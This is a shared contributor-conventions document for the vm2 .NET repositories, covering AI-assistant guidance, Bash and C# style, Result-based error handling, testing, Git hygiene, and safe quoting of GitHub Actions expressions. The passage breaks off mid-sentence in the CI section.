# vm2 Shared Conventions

<!-- TOC tocDepth:2..3 chapterDepth:2..6 -->

- [vm2 Shared Conventions](#vm2-shared-conventions)
  - [For AI Coding Assistants](#for-ai-coding-assistants)
    - [Code Generation and File Editing](#code-generation-and-file-editing)
    - [PR Review](#pr-review)
    - [Language and Writing Quality](#language-and-writing-quality)
  - [Project Structure](#project-structure)
  - [Dependency Management](#dependency-management)
  - [Bash](#bash)
    - [Variables and Dynamic Scope](#variables-and-dynamic-scope)
    - [Function Parameter Validation](#function-parameter-validation)
    - [Argument-Dispatcher Precondition Ordering](#argument-dispatcher-precondition-ordering)
    - [Long-Form Options in Script Bodies](#long-form-options-in-script-bodies)
  - [General C# Coding Conventions](#general-c-coding-conventions)
  - [Async](#async)
  - [Services (if applicable)](#services-if-applicable)
  - [Error Handling](#error-handling)
    - [The `Do` / `TryDo` dual pattern](#the-do--trydo-dual-pattern)
    - [`Result<T>` and railway-oriented programming (ROP)](#resultt-and-railway-oriented-programming-rop)
    - [API surface vs. inner workings](#api-surface-vs-inner-workings)
  - [Testing](#testing)
  - [Performance Benchmarks](#performance-benchmarks)
  - [Performance](#performance)
  - [Security](#security)
  - [Naming](#naming)
  - [AOT and Trimming](#aot-and-trimming)
  - [Git and PR Hygiene](#git-and-pr-hygiene)
  - [Documentation](#documentation)
  - [References](#references)
    - [Markdown](#markdown)
  - [File Modification](#file-modification)
  - [CI / GitHub Actions](#ci--github-actions)
    - [Quoting GitHub Actions Expressions in Shell Steps](#quoting-github-actions-expressions-in-shell-steps)
    - [Escaping Free-Form Text in Workflow Commands](#escaping-free-form-text-in-workflow-commands)
    - [GitHub Actions Expressions: `&&`/`||` Is Not If/Then/Else](#github-actions-expressions--is-not-ifthenelse)
  - [Build Configuration, TFMs, RIDs, and Preprocessor Symbols](#build-configuration-tfms-rids-and-preprocessor-symbols)

<!-- /TOC -->

The *vm2* family of repositories (packages, solutions, etc.) **share a common set of conventions** for the directory
structure, project structure, coding style, documentation style, Git and PR hygiene, and more. This file documents these
shared conventions to ensure **consistency across all repositories** and to provide guidance for contributors.

The key words **MUST**, **MUST NOT**, **SHOULD**, **SHOULD NOT**, and **MAY** in this document are to be interpreted as
described in [RFC 2119](https://www.rfc-editor.org/rfc/rfc2119).

> [!IMPORTANT]
> **These are defaults with reasons, not dogma.** Always question a rule rather than obey it reflexively: a rule
> earns the burden of proof for *following* it, and an exception earns the burden of proof for *breaking* it — adjudicate
> each case on its merits, not on the rule's authority. You **MAY** break any convention here when you can articulate why
> its underlying reason does not apply to the case at hand — but you **MUST** record that rationale in writing (a code
> comment, the `CLAUDE.md`, or the PR description), so the exception is a documented, auditable decision rather than
> silent drift. An undocumented deviation is a violation; a documented, well-argued one is the process working.

> [!NOTE]
> This file is **copied identically to each repo's `.github/` directory** via `diff-shared.sh`.
> The canonical source of truth is `vm2.Templates/templates/AddNewPackage/content/.github/CONVENTIONS.md`.
> **Edit the canonical copy first**, then propagate with `diff-shared.sh`.
> Repo-specific overrides belong in `CLAUDE.md` and `copilot-instructions.md`, not here.

## For AI Coding Assistants

This section consolidates instructions specifically for AI coding assistants (Claude, Copilot, etc.). The conventions
in the rest of this document apply to all contributors — human and AI alike.

### Code Generation and File Editing

- **Wrap complete generated Markdown files in tilde fences** (`~~~markdown`) so the user can copy them cleanly
- **Align Markdown table columns with spaces** so the table is readable in raw Markdown, not only in the rendered view
- Do not remove commented-out code or configuration comments without explicit permission; feel free to *suggest* removal
- Preserve YAML/JSON/XML comments in configuration files
- For GitHub Actions workflows: preserve commented-out alternatives and explanatory notes
- When adding new code, comment on *why* it exists — non-obvious constraints, invariants, workarounds, TODOs with context
- When refactoring, update affected comments to maintain accuracy

### PR Review

- If a PR addresses more than one logical concern, **reject it** and request that it be split — do not approve or suggest
  improvements until the scope is reduced to one concern

### Language and Writing Quality

The project owner is a non-native English speaker.

- Always check spelling, grammar, and technical English in all documentation and comments
- Recommend better, idiomatic wording for unclear, passive, or awkward sentences
- Prefer active voice
- Explain why a suggested change improves the text
- When suggesting a correction, add one short sentence stating exactly what changed and why — especially for small edits
  such as punctuation, articles, or word order
- Examples:
  - ❌ "The pattern is being matched by the enumerator"
  - ✅ "The enumerator matches the pattern"

## Project Structure

- Solutions: **`.slnx` format** (Visual Studio 2022+)
- `Directory.Build.props` for shared build settings
- `Directory.Packages.props` for centralized package version management
- Project files: **SDK-style**
- Global usings: defined in **`usings.cs`** per project
- Standard folder layout:
  - `src/` — source code for deliverables
  - `tests/` — test projects (xUnit v3, FluentAssertions, NSubstitute, MTP v2, Coverlet)
  - `benchmarks/` — BenchmarkDotNet projects (desirable)
  - `examples/` — usage examples (desirable; prefer single-file programs)
  - `docs/` — documentation beyond README.md (optional)
  - `.github/`
    - AI-specific guidance and conventions (`CONVENTIONS.md` and/or `copilot-instructions.md`)
    - dependabot configuration (`dependabot.yml`)
    - issue and pull request templates (`ISSUE_TEMPLATE/` and `PULL_REQUEST_TEMPLATE.md`)
  - `.github/workflows/` — GitHub Actions CI/CD (`CI.yaml`, `Prerelease.yaml`, `Release.yaml`, `RefreshLockFiles.yaml`, `AutoMerge.yaml`, `ClearCache.yaml`, `RebuildBenchHistory.yaml`)

## Dependency Management

- **Use `Directory.Build.props` and `Directory.Packages.props`** for shared build configuration and centralized package
  version management; `*.csproj` files reference packages without versions
- **Restore with `dotnet restore --use-lock-file`** to pin exact versions; commit `packages.lock.json`
- **Build with `dotnet restore --use-lock-file ... && dotnet build --no-restore ...`**
- When dependencies change: update `Directory.Packages.props`, **AND** then run `dotnet restore --force-evaluate`, commit both files
- Dependabot watches `Directory.Packages.props`; after merging a Dependabot PR, run `dotnet restore --force-evaluate` (also done by `RefreshLockFiles.yaml` and `AutoMerge.yaml`)

## Bash

### Variables and Dynamic Scope

- Function-local variable names MUST begin with `_`. Bash uses dynamic scope: a called function can read and modify the
  caller's locals unless it declares a local variable with the same name. The prefix reduces accidental collisions with
  globals and environment variables; it does not eliminate collisions between functions.
- A nameref (`local -n`) MUST have a name distinct from the target name and from locals in callers that may be visible
  through dynamic scope. In particular, a function receiving a target variable name MUST NOT give its nameref the same
  name commonly used by callers; that can create a circular nameref.
- Validate a variable name before creating a nameref to it. Create the nameref only after the parameter-validation gate.
- When iterating over variable names, use indirect expansion (`${!_name}`) rather than assigning successive targets to a
  nameref declared outside the loop. Assigning to such a nameref writes through to its current target; it does not
  reliably re-target the reference.
- Remember that the left side of a pipeline executes in a subshell. A function that mutates a variable through a nameref
  MUST run in the current shell; pass input through redirection or process substitution instead of piping into it.

### Function Parameter Validation

Reusable functions MUST accumulate all useful parameter errors and pass one validation gate before business logic:

```bash
function example()
{
    local -i _rc="$success"

    (( $# == 1 || $# == 2 )) || {
        _rc="$err_invalid_arguments"
        error -ec "$_rc" "${FUNCNAME[0]}() requires one or two arguments (provided $#)."
    }
    [[ -v 1 && -n $1 ]] || {
        _rc="$err_argument_value"
        error -ec "$_rc" "${FUNCNAME[0]}() requires argument 1, the input name, to be non-empty (provided '${1-<missing>}')."
    }
    [[ ! -v 2 || $2 =~ ^(true|false)$ ]] || {
        _rc="$err_argument_type"
        error -ec "$_rc" "${FUNCNAME[0]}() requires optional argument 2 to be 'true' or 'false' (provided '${2-<missing>}')."
    }

    (( _rc == success )) || return "$err_invalid_arguments"

    local _input=$1
    local _flag=${2:-false}
    # business logic
}
```

- Check overall arity separately with `$#`. Do not return immediately after the arity check: report independently useful
  errors for missing or invalid arguments as well.
- Test a required positional parameter with `[[ -v N && predicate ]]`. Test an optional parameter with
  `[[ ! -v N || predicate ]]`. The existence check MUST precede expansion of `$N`, so validation remains safe under
  `set -u`.
- Commands cannot be invoked inside `[[ ... ]]`. Guard command predicates explicitly, for example:
  `[[ -v 1 ]] && is_defined_array "$1" || { ...; }`.
- Each failed check MUST log the specific applicable error code (`$err_argument_type`, `$err_argument_value`,
  `$err_invalid_nameref`, and so on). After all checks, the validation gate MUST return the generic
  `$err_invalid_arguments`, so callers need only one sentinel for a bad call.
- Error messages MUST identify the argument number, its role, and the expected constraint. Render a possibly absent
  value with `${N-<missing>}`; never expand an unguarded positional parameter merely to report an error.
- Do not assign required positional parameters to locals, create namerefs, or perform business logic before the gate.
- Validation of global or environment state is a precondition check, not argument validation. It MAY use the same
  accumulate-then-gate shape, but MUST return the code that describes the failed precondition, commonly
  `$err_logic_error`, rather than `$err_invalid_arguments`.
- A parser that consumes arguments with `shift` MAY use multiple validation gates, one before each dependent phase.
- Top-level CLI parsers and configuration functions that intentionally terminate through `usage()` or
  `exit_if_has_errors()` MUST retain that process-exit behavior. They SHOULD accumulate errors with `error` calls and
  invoke the exit gate once; do not convert them into reusable return-based functions.

### Argument-Dispatcher Precondition Ordering

Bash argument parsers commonly chain several optional handlers, each claiming the tokens it recognizes and returning
failure for the rest, so the caller can fall through to the next one (e.g. a script's own `case` block trying
`get_common_arg`, then a shared `get_common_*_arg`, then its own options). In this shape:

- **Determine applicability before validating shape.** A handler MUST decide whether an option belongs to it (a
  `case`/pattern match on the option's *name*) before it inspects or requires anything about the option's *value*.
  Checking a value's presence or format ahead of that membership check makes the handler misfire on inputs that were
  never meant for it — for example, an ordinary positional argument that happens to be the last token on the command
  line gets treated as "my option, and its value is missing," when it is not this handler's option at all.
- A handler in this chain has exactly one legitimate way to say "not mine": return failure without touching the
  value or any option-specific state. It has exactly one legitimate way to say "mine, but malformed": having matched
  the option name, *then* validate the value and report a specific, actionable error.
- When adding or removing a value-taking option from such a dispatcher, also update any downstream no-op reservation
  list (a `case` arm like `-a|-c|-f|... ) ;;` that exists purely to reserve those letters/names so a later `case` arm
  in the same function does not shadow the shared handler). A stale reservation silently swallows a letter the shared
  handler no longer claims, or fails to reserve one it newly does.

### Long-Form Options in Script Bodies

When a script or function invokes another vm2.DevOps script or library function that itself accepts an option, use
the option's **long form** (`--verbose`, `--header`, `--configuration`) in the checked-in call, not its short alias
(`-v`, `-h`, `-c`). A long-form flag is self-documenting at the call site — a reader does not need to look up what
`-md` means the way they might need to for `--markdown`. Short forms exist for fast, interactive, one-off terminal
use, where brevity outweighs at-a-glance clarity; that tradeoff does not hold for a call site that is read far more
often than it is typed.

```bash
# Preferred: long-form options make the call self-explanatory
dump_vars --force --quiet --header "Arguments for $script_name:" package_project reason

# Avoid: short forms make the reader go look up what -f/-q/-h mean
dump_vars -f -q -h "Arguments for $script_name:" package_project reason
```

**Exception: the `message()`-family functions** (`error`, `warning`, `info`, `trace`, `bug`, `usage`,
`exit_with_error`, `fatal_exit`). Their own options — `--error-code`/`-ec`, `--stack-depth`/`-sd`,
`--no-stack`/`-ns`, `--stack-skip`/`-ss` — are used in **short** form throughout the codebase, by established
convention: these calls appear at essentially every validation and error-reporting site in every script, and the
short forms keep them visually compact, so the part that actually matters at each call site — the message text —
stays the most prominent thing on the line.

```bash
# Exception: message()-family functions keep their short forms
error -ec "$err_argument_value" "Bad commit message: $subject"
usage -ec "$_rc" -sd 3 "Invalid argument value for the option <option_name>"
```

## General C# Coding Conventions

- **See the repo's `.editorconfig` first** — it is authoritative for style and analyzers
- File-scoped namespaces
- Implicit usings for common namespaces (defined in `usings.cs`) or `<Using Include="..." />` in `*.csproj` and `Directory.Build.props`
- `record` for immutable data models and DTOs
- `readonly record struct` for small immutable value objects (e.g. `Ulid`, `Result<T>`)
- `internal` by default; **`public` only for intentional API surface**. For referencing internal classes and members from say test projects, use the `InternalsVisibleTo` attribute rather than making them `public`
- `sealed` by default; open **only** when extensibility is required and justified
- **Instance methods for a type's own algebra; extension methods only to adapt what you don't own.** A method's
  natural home is *inside* the type when the type is yours and the method is part of its core behavior — it gets direct
  access to private state (no widening the public surface just to feed a helper), it is discoverable on `.` without an
  import, and the type's behavior stays cohesive in one file. Reach for an **extension method** when, and only when:
  - the receiver is a type you **do not own** (`Task<T>`, `IEnumerable<T>`, `Func<>`, `Nullable<T>`, a third-party type)
    — you *cannot* add an instance method, so lifting/adapting it (`.MapAsync`, `.Traverse`, `.ToResult`) must be an
    extension. This is why LINQ and most FP combinators over BCL types are extensions;
  - the operation is defined over a **pattern across several types** rather than one type (`Traverse`, `Sequence`,
    `Apply`), so no single type is its home.

  Do **not** scatter a type's own core operations (e.g. `Option<T>.Map`/`Bind`, `Result<T>.Ensure`/`Tap`) into external
  static classes; keep them inside the type. When extensions are unavoidable, group them in one clearly named static
  class per concern (`OptionExtensions`, `ResultAsyncExtensions`) so the out-of-type code is organized, not sprinkled.
- **Compose, don't impersonate.** A type MUST NOT implement an interface (or expose a conversion) merely to borrow the
  ergonomics that come with *being* that thing when it is not semantically that thing. Gain a capability from the
  *method shapes* the feature actually requires, not from a false `is-a`. For example, support LINQ query syntax over a
  monad by giving it `Select`/`SelectMany`/`Where` **methods** rather than implementing `IEnumerable<T>` — a monad
  (`Option<T>`, `Result<T>`, `Task<T>`) is **not** a collection, and claiming to be one floods its surface with
  meaningless operators (`OrderBy`, `Zip`, `Chunk`), re-opens throwing extractors (`First`, `Single`) that bypass the
  type's own safety, and boxes the value. This is distinct from *prefer composition over inheritance*: that rule governs
  implementation **reuse** (`has-a` over `extends-a`); this one governs interface **honesty** (do not advertise an
  identity you do not have).
- Expression-bodied members when trivial and readable (one-liners, simple getters)
- `var` when the type is obvious from the right-hand side
- **Nullable reference types always enabled**; treat warnings as design feedback
- **No static mutable state** unless guarded with proper synchronization (prefer `ReaderWriterLockSlim`)
- Prefer `[GeneratedRegex(...)]` partial methods over `new Regex(..., RegexOptions.Compiled)` for static patterns
- **Dependency injection** over service locator
- Use `System.TimeProvider` (.NET 8+) for time abstraction; `FakeTimeProvider` in tests — **never** a homegrown `IClock`
- Guard clauses at method entry (throw early; no nested pyramids)
- All public interfaces must validate their input parameters and throw appropriate exceptions (e.g., `ArgumentNullException`, `ArgumentException`) for invalid arguments even if nullable references are enabled
- Pattern matching (`is`, `switch` expressions) over `if`/`else` chains when semantically clearer
- No curly braces for single-line blocks unless they improve readability
- `#region` / `#endregion` acceptable for logical grouping in larger files and for interface implementations
- EBNF (ISO 14977) for grammar definitions: `=` definitions, `,` concatenation, `;` terminator, `[ ]` optional,
  `|` alternation, `"..."` terminals

## Async

- Async methods suffixed with `Async`
- `CancellationToken ct` **threaded through all async call chains**
- **No fire-and-forget** except documented background operations with proper error handling and logging
- `ValueTask` only when allocation reduction is measurable (hot paths, cached results)
- **Async-only for I/O-bound surfaces.** Where an operation is genuinely I/O-bound, expose **only** the async form — no
  synchronous twin. The only way to offer a sync twin over an async internal is sync-over-async (`.Result` /
  `.GetAwaiter().GetResult()`), which risks thread-pool starvation and deadlocks; refusing the sync twin is refusing to
  ship that hazard. (Precedent: the EF Core Cosmos DB provider is async-only and throws on synchronous calls.)
- Scope the rule to genuinely I/O-bound work. Code MUST NOT fake async over CPU-bound or in-memory work (no `Task.Run`
  wrappers to present an async face); pure-computation packages stay synchronous.
- An inherited or otherwise unavoidable synchronous seam (e.g. a sync interface member the type MUST implement) MUST throw
  a clear usage exception (e.g. "this API is async-only; call `…Async`"), never silently block via sync-over-async.
- Prefer the asynchronous BCL interfaces — `IAsyncDisposable` over `IDisposable`, `IAsyncEnumerable<T>` over
  `IEnumerable<T>` — so async-only surfaces have no synchronous dead ends.
- A library MUST NOT ship sync-over-async on a consumer's behalf. A consumer trapped in an inherently synchronous context
  owns that bridge; the library does not relocate the hazard into itself.

## Services (if applicable)

- Prefer async APIs even when the current implementation is synchronous — avoids breaking changes later
- Within a cluster, prefer gRPC and messaging over HTTP/REST for performance and reliability

## Error Handling

**The governing rule — exceptions guard the contract; results carry outcomes:**

> An **exception** means *the caller or the environment is broken*: a precondition was violated (a caller bug) or the
> machine failed (a catastrophe). A **`Result<T>`** means *the operation executed correctly and legitimately did not
> succeed* — a normal alternate outcome the caller is expected to branch on.

The deciding axis is **contractual outcome vs. contract violation**, **NOT** *recoverable vs. unrecoverable*. A failure
MAY be unrecoverable and still be a `Result` (for signature visibility, allocation cost, and error accumulation); a
failure MAY be trivially recoverable and still be an exception, because it was a caller bug.

- Expected, correct-usage failures (not-found, business-invariant violation, etc.) SHOULD be modeled as `Result<T>`.
- Caller mistakes — invalid arguments, violated preconditions the caller could have checked upfront, API misuse — MUST
  throw (the `ArgumentException` family). Fail fast and loud; these are bugs, not outcomes. This is **argument
  validation** and is distinct from **invariant validation** (below), which returns a `Result`.
- Unrecoverable or catastrophic failures (I/O loss, OOM) MUST propagate to a single top-level boundary handler. Code MUST
  NOT wrap every call in `try`/`catch`, and MUST NOT catch `Exception` to repackage it as a `Result` — that hides bugs
  and catastrophes that MUST surface loudly. Convert an exception to a `Result` only at a specific boundary, catching a
  **specific, known** exception type that represents an expected outcome (e.g. via a `Try(...)` combinator).
- **Never use exceptions for expected control flow.** **Never swallow exceptions** — at minimum log or rethrow.
- **Never log sensitive data** (PII, secrets). **Use logger scopes** for context; never string concatenation in messages.
- **Prefer `ILogger<T>`** with structured logging.
- In services: prefer circuit breakers and retries over exceptions for transient faults; a transient fault handled by a
  resilience pipeline (e.g. optimistic-concurrency retry) MAY be surfaced as an exception, because the resilience layer
  is exception-shaped.
- In services: use health checks and OpenTelemetry for observability, not exceptions.

### The `Do` / `TryDo` dual pattern

When an operation's failure may be *either* a caller bug *or* an expected outcome depending on the call site, expose
**both** forms (generalizing `Parse` / `TryParse`):

- `Do(...)` — the bare-named method THROWS on failure. Use at **trusted internal call sites** where a failure is a bug.
  The thrown exception SHOULD carry the full failure detail (e.g. every validation failure, like a good parser).
- `TryDo(...)` — returns `Result<T>` (or `Result`). Use at **boundaries** (untrusted input, optional presence) where a
  failure is an expected outcome to branch on.

Concrete instances: `Validate` / `TryValidate`, `Find` / `TryFind`, `Get` / `TryGet`. The dual form makes the functional
dependency **opt-in**: a consumer who does not want railway-oriented code uses the throwing `Do` form, catches ordinary
exceptions, and never references `vm2.Functional`; `TryDo` is for consumers who opt into `Result`.

### `Result<T>` and railway-oriented programming (ROP)

- `Result<T>` and its `Error` hierarchy live in **`vm2.Functional`**. `Result<T>` is a `readonly record struct`; `Error`
  is a polymorphic class hierarchy matched (via `switch`) at the boundary — the ROP analogue of a `catch` series.
- Compose fallible steps with combinators (`Bind`, `Map`, `Ensure`, `Tap`, `Match`). The upstream-failure short-circuit
  MUST live in the combinators, written once; business functions take the **unwrapped** value and return `Result<T>`,
  and MUST NOT re-check upstream failure. `Match` is the only place a pipeline leaves the rails.
- Invariant validation MUST accumulate **all** failures into one aggregate `Error` (applicative), not just the first.
- An `Error.Code`, when present, is a **stable, external contract** for consumers that cannot see the CLR type (API
  clients, localization, telemetry). Namespace it as `<resource>.<kind>` (e.g. `order.not_found`, `file.not_found`) and
  match its granularity to how consumers branch. Derive it from a stable **domain term**, NEVER from the CLR type name;
  omit it entirely for purely internal errors (discriminate by type instead). For coarse in-process handling shared
  across several codes, use a marker interface (e.g. `INotFoundError`) alongside the specific `Code`.

### API surface vs. inner workings

- Opinionated third-party libraries (e.g. FluentValidation) are **implementation details**. They MUST NOT appear on the
  public surface; wrap them behind a clean vm2 interface (`IValidatable`) so consumers see `Result` / `Validate`, never
  the library's vocabulary.
- The public surface MUST expose only vm2-owned outcome types (`Result<T>`, `Error`). Code MUST NOT surface a
  third-party `Result` / `Either` / `OneOf` type — its version bumps would become your breaking changes.
- A type on a **published** API surface is a binary-compatibility commitment. A `vm2.Functional` type MUST be stabilized
  (shape locked, edge cases such as the `default(Result<T>)` state decided, tests in place) **before** it appears on a
  published signature.
- Async surfaces are `ValueTask<Result<T>>` / `Task<Result<T>>`; the async combinator family (`BindAsync`, `MapAsync`,
  `EnsureAsync`) MUST be provided so the double-wrapped result composes without hand-unwrapping.

## Testing

- Framework: **xUnit v3 with Microsoft Testing Platform (MTP) v2**
- Assertions: **FluentAssertions** (never `Assert.*` unless framework-specific)
- Mocks: **NSubstitute**
- Use **vm2.TestUtilities**:
  - `TestUtilities.PathLine()` — locates failing theory tests
  - `XUnitLogger` — captures structured logs without a real logger
  - `TestBase` — inherit `ITestOutputHelper Out`, suppress FluentAssertions licensing noise, get `FluentAssertionsExceptionFormatter`
- Test naming:
  - Sync:  `MethodName_WhenCondition_ShouldOutcome`
  - Async: `MethodName_WhenCondition_ShouldOutcome_Async`
- Arrange / Act / Assert with clear blank-line separation
- One logical assertion per test (chained FluentAssertions counts as one)
- Prefer `[Theory]` with inline data; use `[MemberData]` or `[ClassData]` for complex scenarios
- No testing of implementation details; mock only observable behavior
- `[Trait("Category","Integration")]` for slow or external-dependency tests
- Inject mock clock, e.g., `FakeTimeProvider` — never `DateTime.UtcNow` directly in tests
- Inject mock ID providers — never rely on live generation in tests
- Mock only external collaborators (I/O, time, random, repository, bus); never mock value objects
- Strive for 80% code coverage on critical paths; prioritize meaningful tests over coverage numbers
- Upload coverage to Codecov
- **Equality-contract tests for every value type.** Any type that defines value equality (`record`,
  `record struct`, or a `struct`/`class` overriding `Equals`/`GetHashCode`/`==`) **MUST** have tests pinning the
  contract: reflexivity, symmetry, transitivity, `Equals`/`==` agreement, and `GetHashCode` consistency (equal
  values hash equal). A type that is **not** meant to be compared MUST make that explicit (do not silently rely on
  the reflection-based `ValueType.Equals` fallback — it boxes and is a hidden performance trap). This applies to
  domain value objects and to library primitives alike.
- **Algebraic-law tests for every monadic (or otherwise law-bearing) type.** A type that claims to be a monad,
  functor, applicative, monoid, etc. **MUST** have tests proving the corresponding laws hold — for a monad: functor
  identity (`m.Map(x => x) == m`), left identity (`Return(a).Bind(f) == f(a)`), right identity (`m.Bind(Return) == m`),
  associativity, and `Map`/`Bind` consistency (`m.Map(f) == m.Bind(x => Return(f(x)))`). These are trivial to verify
  for simple types and essential for complex ones (e.g. a parser's `Bind`); write them **regardless**, as executable
  specification. Prefer `[Theory]` with representative functions/inputs for simple types; reach for property-based
  generation (FsCheck/CsCheck) where the input space is large.

## Performance Benchmarks

- Framework: **BenchmarkDotNet**
- Derive from `BenchmarkBase` to inherit consistent `MemoryDiagnoser`, `GcServer`, and other attributes
- Benchmark hot paths and critical scenarios, not every method
- Use `GlobalSetup` for expensive initialization; `IterationSetup` for per-iteration setup
- Use `Params` for parameterized benchmarks to compare inputs
- Upload results to Bencher for regression tracking

## Performance

- `AsNoTracking()` for read-only EF queries
- Prefer lazy evaluation with iterators (`yield return`) over eager materialization for sequences
- Prefer lazy initialization (`Lazy<T>`, `Lazy<T>(LazyThreadSafetyMode.*)`) for expensive objects
- No unnecessary `ToList()` inside query pipelines
- `ReadOnlySpan<char>` for parsing hot paths
- `stackalloc` for small buffers with heap fallback for large inputs

## Security

- No embedded secrets — secure storage, user secrets, or environment variables only
- Validate all external inputs at system boundaries
- Principle of least privilege throughout
- Prefer quantum-resistant algorithms for cryptography where applicable

## Naming

- Events: past tense — `OrderPlacedEvent`
- Commands: imperative — `PlaceOrderCommand`
- Handlers: `...Handler` suffix
- Prefer **domain-first public API type names** without suffixes unless required to avoid symbol conflicts
- **Package-first artifact identity**:
  - Package ID: `vm2.<Package>` or `vm2.<Package>.<Feature>`
  - Assembly name: `vm2.<Package>` or `vm2.<Package>.<Feature>`
- **Always set `<RootNamespace>` explicitly** in every `*.csproj`
- **Always set `<OutputType>` explicitly** in every `*.csproj`
- Test projects — assembly: `<Package>.Tests`; namespace: `vm2.Tests.<Package>[.<Feature>]`. Note the placement of the `Tests` segment and the mirroring of the assembly structure: it helps avoiding symbol conflicts. Always `<OutputType>Exe</OutputType>` - xUnit v3 + MTP v2.
- Benchmark projects — assembly: `<Package>.Benchmarks`; namespace: `vm2.Benchmarks.<Package>[.<Feature>]`. Note the placement of the `Benchmarks` segment and the mirroring of the assembly structure: it helps avoiding symbol conflicts. Always `<OutputType>Exe</OutputType>` - BenchmarkDotNet requires the default name for the entry point assembly.
- Do not mix naming strategies within a single repository

## AOT and Trimming

Scope via `Directory.Build.props` (folder-based conditions):

- **Test and benchmark projects** — AOT and trim checks disabled; optimize for correctness/perf feedback:
  `IsAotCompatible=false`, `VerifyReferenceAotCompatibility=false`, `EnableTrimAnalyzer=false`, `IsTrimmable=false`
- **Product projects** — AOT and trim checks enabled, unless code or dependencies explicitly require otherwise:
  `IsAotCompatible=true`, `VerifyReferenceAotCompatibility=true`, `EnableTrimAnalyzer=true`, `IsTrimmable=true`

Diagnostic classification:

- `IL2026` family — trimming compatibility; fix with `DynamicallyAccessedMembersAttribute` or
  `RequiresUnreferencedCodeAttribute` at the API boundary
- `IL3050` family — AOT dynamic-code; fix by removing dynamic patterns or annotating with
  `RequiresDynamicCodeAttribute`; split into AOT-safe core + non-AOT companion if the surface is large
- `IL3058` — referenced assembly not marked AOT-compatible

IL warning suppression policy:

- **Do not suppress IL warnings** (`IL2xxx`, `IL3xxx`) by default
- Only suppress when the safety argument is explicit, tested, and documented
- If suppression seems like the easiest fix, stop and re-evaluate the API design first

If strict AOT/trimming is not worth it for a specific product project, opt out explicitly in `*.csproj` with documented
rationale in README/CHANGELOG/PR.

## Git and PR Hygiene

- Commit messages: `<type>[(scope)][!]: <description>` — `!` marks a breaking change
  - `fix: correct null reference in UserService`
  - `feat(serialization): add IUtf8SpanFormattable implementation`
- One logical concern per PR
- **Credit AI co-authorship.** When an AI coding assistant materially contributed to a commit (wrote or substantially
  shaped the code, tests, or docs), add a `Co-Authored-By:` trailer at the end of the commit message naming the
  assistant, e.g. `Co-Authored-By: Claude Opus 4.8 <noreply@anthropic.com>`. This keeps authorship honest and the
  history auditable; it is not optional vanity — it records who (or what) actually shaped the change.

## Documentation

- **Technical and specification documents** MUST include the RFC 2119 boilerplate:
  "The key words **MUST**, **MUST NOT**, **SHOULD**, **SHOULD NOT**, and **MAY** in this document are to be interpreted
  as described in [RFC 2119](https://www.rfc-editor.org/rfc/rfc2119)."
- **Blogs and free-form articles** (`docs/blog-*.md`) MUST NOT use RFC 2119 keywords as normative terms
- Use clear, concise, idiomatic language; prefer active voice and direct statements
- Explain the *why* and intent behind decisions, not just the *what*
- **XML docs on all public API surface**
- Line length: 128 characters maximum
- XML tags on their own lines unless the entire XML element fits on one line
- **Cite specifications** (POSIX, RFC, SemVer, ULID spec, etc.) with title and URL
- **README code examples must be self-contained and runnable**: include all `using` directives, declare all variables,
  avoid unexplained placeholders. A reader must be able to paste the example and have it compile
- Standard references block:

## References

- [Title](URL) — Author or organization

### Markdown

- Follow markdownlint default rules (or `.markdownlint.json` if present)
- **Align table columns with spaces** for readability in raw Markdown
- 4-space indentation for code blocks inside Markdown
- **Use `1.` for all items in ordered lists** (renderers number automatically)
- Prefer kebab-case in YAML; avoid snake_case unless required by an external schema

## File Modification

- **Edit shared files at their canonical source, never in a consumer repo.** Files synced by `diff-shared.sh` (mapped in
  `diff-shared.config.json`) are sourced from `vm2.Templates` (the `AddNewPackage` content). Edit the canonical copy
  first, then propagate with `diff-shared.sh`.
  - Action **`copy`** (`.editorconfig`, `.gitignore`, `.gitattributes`, `.gitmessage`, `CONVENTIONS.md`, `global.json`,
    `LICENSE`, `NuGet.config`, `dependabot.yml`, the `cliff.*` configs, and several workflows — see the config for the
    authoritative list): **100% shared and overwritten verbatim.** A direct edit in a consumer repo MUST NOT be made —
    the next `diff-shared.sh` run silently clobbers it.
  - Action **`ask to merge`** (`CI`/`Prerelease`/`Release` workflows, `Directory.Build.props`, `Directory.Packages.props`,
    `copilot-instructions.md`): partially shared — still edit the canonical copy first, then merge; keep repo-specific
    overrides in the consumer repo.
- **Preserve existing comments** unless correcting inaccuracies or improving English
- Do not remove commented-out code without explicit permission
- Preserve YAML/JSON comments in configuration files
- For GitHub Actions workflows: preserve commented-out alternatives and explanatory notes

## CI / GitHub Actions

When adding a new project, register it in `.github/workflows/CI.yaml`:

| Array                | Purpose                               |
|----------------------|---------------------------------------|
| `BUILD_PROJECTS`     | Solutions/projects to build           |
| `TEST_PROJECTS`      | Test projects to build and run        |
| `BENCHMARK_PROJECTS` | Benchmark projects to build and run   |
| `PACKAGE_PROJECTS`   | Projects to pack as NuGet packages    |

Also add the project to the `.slnx` solution file under the appropriate folder.

### Quoting GitHub Actions Expressions in Shell Steps

GitHub substitutes a `${{ ... }}` expression as literal text **before** the shell parses the line — the shell never
sees the expression syntax itself, only whatever string came out of it. This makes the quoting around it a real
security boundary, not a style choice.

- **Always route every `${{ ... }}` expression through the step's `env:`, then reference the resulting shell
  variable. No per-value judgment call — that judgment call is the bug.** This is the only pattern immune to
  injection regardless of what the value contains or which expression source it comes from, because GitHub Actions
  writes `env:` values into the runner's environment directly — the shell reads them as inert data and never
  re-parses them for metacharacters, quotes, or command substitution. Deciding case by case whether a *particular*
  `${{ }}` source is "safe enough" to skip this is exactly how `reason` and `bencher-branch` shipped single-quoted
  directly in this repo's own reusable workflows: the source looked bounded at the time, or became less bounded
  later without the `run:` step itself changing. Reaching for `env:` unconditionally costs a couple of extra lines
  and removes the need to ever re-derive that judgment.

  ```yaml
  # Always: every ${{ }} expression goes through env:, whatever its source
  - name: Compute release version
    env:
      MINVER_TAG_PREFIX: ${{ inputs.minver-tag-prefix }}
      REASON: ${{ inputs.reason }}
      HEAD_REF: ${{ github.head_ref }}
    run: |
        declare -a args=(
            --minver-tag-prefix "$MINVER_TAG_PREFIX"
            --reason            "$REASON"
            --head-ref          "$HEAD_REF"
        )
  ```

- **Pre-approved exceptions — the *only* expressions that MAY be single-quoted `'${{ ... }}'` directly instead of
  going through `env:`:** `github.actor` (a platform-enforced identity string — GitHub usernames and `<name>[bot]`
  app logins cannot contain a `'`, by GitHub's own account/app-registration rules, so there is nothing to escape),
  `github.event_name` (a fixed enum GitHub itself defines), and a literal boolean/numeric constant. This is a
  closed, named list, not a category to reason your way into: a `needs.*`/`steps.*` output, a `vars.*` value, a
  job-computed enum, or anything else that merely *looks* bounded today does **not** qualify, no matter how safe it
